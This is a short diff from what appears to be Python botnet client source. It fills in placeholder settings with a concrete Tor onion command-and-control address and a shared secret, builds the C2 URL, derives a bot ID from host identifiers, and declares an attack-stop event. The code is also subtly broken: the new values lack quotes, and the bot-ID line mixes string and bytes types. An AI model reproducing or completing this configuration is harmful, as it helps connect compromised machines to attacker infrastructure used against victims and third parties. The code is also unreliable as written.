@@ -17,8 +17,8 @@ import getpass
 import urllib.request
 import tarfile
 
-C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"
-SHARED_SECRET = "CHANGE_TO_C2_SECRET"
+C2_ONION = zruun6ptse2pgw7337ow5sg22utkhvoxcarcsmb2cg275atldrhbszad.onion
+SHARED_SECRET = ad1f3ccd547dec42908fc2cdb5b400c1
 C2_URL = f"http://{C2_ONION}"
 BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
 ATTACK_STOP = threading.Event()
